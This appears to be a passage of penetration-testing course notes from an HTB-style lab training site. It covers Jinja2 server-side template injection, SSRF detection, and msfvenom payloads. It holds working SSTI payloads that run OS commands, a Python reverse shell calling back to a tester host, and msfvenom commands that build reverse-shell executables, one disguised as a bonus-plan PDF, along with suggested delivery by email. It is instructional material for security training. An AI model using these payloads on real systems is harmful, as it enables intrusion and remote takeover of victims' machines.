&#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;_sha512.sha384&#39;&gt;, &lt;class &#39;_sha512.sha512&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;unpack_iterator&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class {{ ''.__class__.__mro__ }} &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#39;&gt;, &lt;class &#39;dataclasses._MISSING_TYPE&#39;&gt;, &lt;class &#39;dataclasses._FIELD_BASE&#39;&gt;, &lt;class &#39;dataclasses.InitVar&#39;&gt;, &lt;class &#39;dataclasses.Field&#39;&gt;, &lt;class &#39;dataclasses._DataclassParams&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.Event&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.MultipartDecoder&#39;&gt;, &lt;class &#39;werkzeug.sansio.multipart.MultipartEncoder&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.user_agent.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.useragents._UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.sansio.request.Request&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.sansio.response.Response&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContext&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local._ProxyLookup&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.scaffold.Scaffold&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;class &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;]</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> Print out the number and the method names using the following payload { % for i in range ( 450 ) % } {{ i }} {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ ()[ i ] . __name__ }} { % endfor % } hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a> 0 type 1 weakref 2 weakcallableproxy 3 weakproxy 4 int 5 bytearray 6 bytes 7 list 8 NoneType 9 NotImplementedType 10 traceback 11 super 12 range 13 dict 14 dict_keys 15 dict_values 16 dict_items 17 dict_reversekeyiterator 18 dict_reversevalueiterator 19 dict_reverseitemiterator 20 odict_iterator 21 set 22 str 23 slice 24 staticmethod 25 complex 26 float 27 frozenset 28 property 29 managedbuffer 30 memoryview 31 tuple 32 enumerate 33 reversed 34 stderrprinter 35 code 36 frame 37 builtin_function_or_method 38 method 39 function 40 mappingproxy 41 generator 42 getset_descriptor 43 wrapper_descriptor 44 method-wrapper 45 ellipsis 46 member_descriptor 47 SimpleNamespace 48 PyCapsule 49 longrange_iterator 50 cell 51 instancemethod 52 classmethod_descriptor 53 method_descriptor 54 callable_iterator 55 iterator 56 PickleBuffer 57 coroutine 58 coroutine_wrapper 59 InterpreterID 60 EncodingMap 61 fieldnameiterator 62 formatteriterator 63 BaseException 64 hamt 65 hamt_array_node 66 hamt_bitmap_node 67 hamt_collision_node 68 keys 69 values 70 items 71 Context 72 ContextVar 73 Token 74 MISSING 75 moduledef 76 module 77 filter 78 map 79 zip 80 _ModuleLock 81 _DummyModuleLock 82 _ModuleLockManager 83 ModuleSpec 84 BuiltinImporter 85 classmethod 86 FrozenImporter 87 _ImportLockContext 88 _localdummy 89 _local 90 lock 91 RLock 92 _IOBase 93 _BytesIOBuffer 94 IncrementalNewlineDecoder 95 ScandirIterator 96 DirEntry 97 WindowsRegistryFinder 98 _LoaderBasics 99 FileLoader 100 _NamespacePath 101 _NamespaceLoader 102 PathFinder 103 FileFinder 104 zipimporter 105 _ZipImportResourceReader 106 Codec 107 IncrementalEncoder 108 IncrementalDecoder 109 StreamReaderWriter 110 StreamRecoder 111 _abc_data 112 ABC 113 dict_itemiterator 114 Hashable 115 Awaitable 116 AsyncIterable 117 async_generator 118 Iterable 119 bytes_iterator 120 bytearray_iterator 121 dict_keyiterator 122 dict_valueiterator 123 list_iterator 124 list_reverseiterator 125 range_iterator 126 set_iterator 127 str_iterator 128 tuple_iterator 129 Sized 130 Container 131 Callable 132 _wrap_close 133 Quitter 134 _Printer 135 _Helper 136 itemgetter 137 attrgetter 138 methodcaller 139 accumulate 140 combinations 141 combinations_with_replacement 142 cycle 143 dropwhile 144 takewhile 145 islice 146 starmap 147 chain 148 compress 149 filterfalse 150 count 151 zip_longest 152 permutations 153 product 154 repeat 155 groupby 156 _grouper 157 _tee 158 _tee_dataobject 159 Repr 160 deque 161 _deque_iterator 162 _deque_reverse_iterator 163 _tuplegetter 164 _Link 165 partial 166 _lru_cache_wrapper 167 partialmethod 168 singledispatchmethod 169 cached_property 170 DynamicClassAttribute 171 _GeneratorWrapper 172 auto 173 Enum 174 Pattern 175 Match 176 SRE_Scanner 177 State 178 SubPattern 179 Tokenizer 180 Scanner 181 Template 182 Formatter 183 ContextDecorator 184 _GeneratorContextManagerBase 185 _BaseExitStack 186 _Final 187 _Immutable 188 Generic 189 _TypingEmpty 190 _TypingEllipsis 191 NamedTuple 192 typing.io 193 typing.re 194 AST 195 _MarkupEscapeHelper 196 poll 197 epoll 198 BaseSelector 199 socket 200 _IterationGuard 201 WeakSet 202 _RLock 203 Condition 204 Semaphore 205 Event 206 Barrier 207 Thread 208 BaseServer 209 ForkingMixIn 210 _NoThreads 211 ThreadingMixIn 212 BaseRequestHandler 213 WarningMessage 214 catch_warnings 215 date 216 timedelta 217 time 218 tzinfo 219 _Info 220 finalize 221 sha384 222 sha512 223 Random 224 _ResultMixinStr 225 _ResultMixinBytes 226 _NetlocResultMixinBase 227 _localized_month 228 _localized_day 229 Calendar 230 different_locale 231 AddrlistClass 232 Struct 233 unpack_iterator 234 Charset 235 Header 236 _ValueFormatter 237 _PolicyBase 238 BufferedSubFile 239 FeedParser 240 Parser 241 BytesParser 242 Message 243 HTTPConnection 244 _SSLContext 245 _SSLSocket 246 MemoryBIO 247 Session 248 SSLObject 249 MimeTypes 250 Compress 251 Decompress 252 BZ2Compressor 253 BZ2Decompressor 254 LZMACompressor 255 LZMADecompressor 256 Bytecode 257 Untokenizer 258 BlockFinder 259 _void 260 _empty 261 Parameter 262 BoundArguments 263 Signature 264 FrameSummary 265 TracebackException 266 LogRecord 267 PercentStyle 268 Formatter 269 BufferingFormatter 270 Filter 271 Filterer 272 PlaceHolder 273 Manager 274 LoggerAdapter 275 _Missing 276 Aborter 277 Href 278 CompletedProcess 279 Popen 280 HASH 281 blake2b 282 blake2s 283 sha3_224 284 sha3_256 285 sha3_384 286 sha3_512 287 shake_128 288 shake_256 289 _RandomNameSequence 290 _TemporaryFileCloser 291 _TemporaryFileWrapper 292 SpooledTemporaryFile 293 TemporaryDirectory 294 Request 295 OpenerDirector 296 BaseHandler 297 HTTPPasswordMgr 298 AbstractBasicAuthHandler 299 AbstractDigestAuthHandler 300 URLopener 301 ftpwrapper 302 Cookie 303 CookiePolicy 304 Absent 305 CookieJar 306 ImmutableListMixin 307 ImmutableDictMixin 308 _omd_bucket 309 Headers 310 ImmutableHeadersMixin 311 IfRange 312 Range 313 ContentRange 314 FileStorage 315 _HAS_DEFAULT_FACTORY_CLASS 316 _MISSING_TYPE 317 _FIELD_BASE 318 InitVar 319 Field 320 _DataclassParams 321 Event 322 MultipartDecoder 323 MultipartEncoder 324 Finder 325 Loader 326 ResourceReader 327 ImpImporter 328 ImpLoader 329 HMAC 330 ClosingIterator 331 FileWrapper 332 _RangeWrapper 333 HTMLBuilder 334 AcceptMixin 335 AuthorizationMixin 336 WWWAuthenticateMixin 337 Scanner 338 Encoder 339 JSONDecoder 340 JSONEncoder 341 FormDataParser 342 MultiPartParser 343 UserAgent 344 _UserAgentParser 345 Request 346 StreamOnlyMixin 347 Response 348 ResponseStream 349 ResponseStreamMixin 350 CommonRequestDescriptorsMixin 351 CommonResponseDescriptorsMixin 352 ETagRequestMixin 353 ETagResponseMixin 354 UserAgentMixin 355 _TestCookieHeaders 356 _TestCookieResponse 357 EnvironBuilder 358 Client 359 Decimal 360 Context 361 SignalDictMixin 362 ContextManager 363 Number 364 UUID 365 Unpickler 366 Pickler 367 Pdata 368 PicklerMemoProxy 369 UnpicklerMemoProxy 370 _Framer 371 _Unframer 372 _Pickler 373 _Unpickler 374 Bucket 375 BytecodeCache 376 MissingType 377 LRUCache 378 Cycler 379 Joiner 380 Namespace 381 EvalContext 382 Node 383 NodeVisitor 384 Symbols 385 MacroRef 386 Frame 387 TemplateReference 388 Context 389 BlockReference 390 LoopContext 391 Macro 392 Undefined 393 NodeVisitor 394 Failure 395 TokenStreamIterator 396 TokenStream 397 Lexer 398 Parser 399 Environment 400 Template 401 TemplateModule 402 TemplateExpression 403 TemplateStream 404 BaseLoader 405 Local 406 LocalStack 407 LocalManager 408 _ProxyLookup 409 LocalProxy 410 SequenceMatcher 411 Differ 412 HtmlDiff 413 _safe_key 414 PrettyPrinter 415 RuleFactory 416 RuleTemplate 417 BaseConverter 418 Map 419 MapAdapter 420 NullTranslations 421 _FixupStream 422 _AtomicFile 423 LazyFile 424 KeepOpenFile 425 PacifyFlushWrapper 426 ParamType 427 Option 428 Argument 429 ParsingState 430 OptionParser 431 HelpFormatter 432 Context 433 BaseCommand 434 Parameter 435 Namespace 436 _FakeSignal 437 DispatchingApp 438 ScriptInfo 439 ConfigAttribute 440 _AppCtxGlobals 441 AppContext 442 RequestContext 443 Scaffold 444 _CompactJSON 445 SigningAlgorithm 446 Signer 447 Serializer 448 JSONTag 449 TaggedJSONSerializer </a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> In the application's response we can see that catch_warnings is located at index #214. We have everything we need to construct an RCE payload, such as the following {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ ()[ 214 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . system ( \"touch /tmp/test1\" ) }} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>0</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> The application returns 0 in its response. This is the return of the value of the command we just executed. 0 indicates that the command was executed without errors. We can identify if test1 was created using the following payload {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ ()[ 214 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . popen ( 'ls /tmp' ) . read ()}} hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D\" <SNIP> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>test1 tmpv4tucw2b </a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <SNIP> </body> We can use some specific functions to facilitate the exploitation of Jinja2 SSTI vulnerabilities. Those are request and lipsum . {{ request . application . __globals__ . __builtins__ . __import__ ( 'os' ) . popen ( 'id' ) . read ()}} {{ lipsum . __globals__ . os . popen ( 'id' ) . read ()}} A reverse shell can also be established through a payload such as the below {{ '' . __class__ . __mro__ [ 1 ] . __subclasses__ ()[ 214 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . popen ( 'python -c \\' socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<PENTESTER_IP>\",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\") \\' ' ) . read ()}}","title":"Python Primer for SSTI"},{"location":"server_side_attacks/ssti_intro/","text":"The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example: {7*7} ${7*7} #{7*7} %{7*7} {{7*7}} ... We will look for \"49\" in the response when injecting these payloads to identify that server-side evaluation occurred. The diagram below from PortsSwigger can help us identify if we are dealing with an SSTI vulnerability and also identify the underlying template engine. In addition to the above diagram, we can try the following approaches to recognize the technology we are dealing with: Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver. PayloadsAllTheThings - Template Injection HackTricks - SSTI (Server Side Template Injection)","title":"Intro"},{"location":"server_side_attacks/time_based_ssrf/","text":"We can also determine the existence of an SSRF vulnerability by observing time differences in responses. This method is also helpful for discovering internal services. Let us submit the following document to the PDF application of the previous section and observe the response time. < html > < body > < b > Time-Based Blind SSRF </ b > < img src = \"http://blah.nonexistent.com\" > </ body > </ html > We can see the service took 10 seconds to respond to the request. If we submit a valid URL inside the HTML document, it will take less time to respond. Remember that internal.app.local was a valid internal application (that we could access through SSRF in the previous section). In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.","title":"Time-Based SSRF"},{"location":"shells_payloads/msfvenom/","text":"Staged vs. Stageless Payloads \u00b6 Staged payloads create a way for us to send over more components of our attack. We can think of it like we are \"setting the stage\" for something even more useful. Take for example this payload linux/x86/shell/reverse_tcp . When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload. Stageless payloads do not have a stage. Take for example this payload linux/zarch/meterpreter_reverse_tcp . Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on stageless Meterpreter payloads . Consider these two windows/meterpreter/reverse_tcp and windows/meterpreter_reverse_tcp . The former is a Staged payload. Notice the naming convention separating the stages. The latter is a Stageless payload since we see the shell payload and network communication in the same portion of the name. Build a Stageless Payload \u00b6 hrmns@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST = 10 .10.14.113 LPORT = 443 -f elf > createbackup.elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf file: 194 bytes Executing a Stageless Payload \u00b6 Get payload onto target system: Email message with the file attached. Download link on a website. Combined with a Metasploit exploit module (this would likely require us to already be on the internal network). Via flash drive as part of an onsite penetration test. Once the file is on that system, it will also need to be executed. We would have a listener ready to catch the connection on the attack box side upon successful execution. NC Connection hrmns@htb[/htb]$ sudo nc -lvnp 443 Building a simple Stageless Payload for a Windows System \u00b6 Use msfvenom to craft an executable (.exe) file that can be run on a Windows system to provide a shell. Windows Payload hrmns@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.113 LPORT = 443 -f exe > BonusCompensationPlanpdf.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of exe file: 73802 bytes Executing a Simple Stageless Payload On a Windows System \u00b6 This is another situation where we need to be creative in getting this payload delivered to a target system. Without any encoding or encryption , the payload in this form would almost certainly be detected by Windows Defender AV. If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session. hrmns@htb[/htb]$ sudo nc -lvnp 443 Listening on 0.0.0.0 443 Connection received on 10.129.144.5 49679 Microsoft Windows [Version 10.0.18362.1256] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Users\\htb-student\\Downloads>dir dir Volume in drive C has no label. Volume Serial Number is DD25-26EB Directory of C:\\Users\\htb-student\\Downloads 09/23/2021 10:26 AM <DIR> . 09/23/2021 10:26 AM 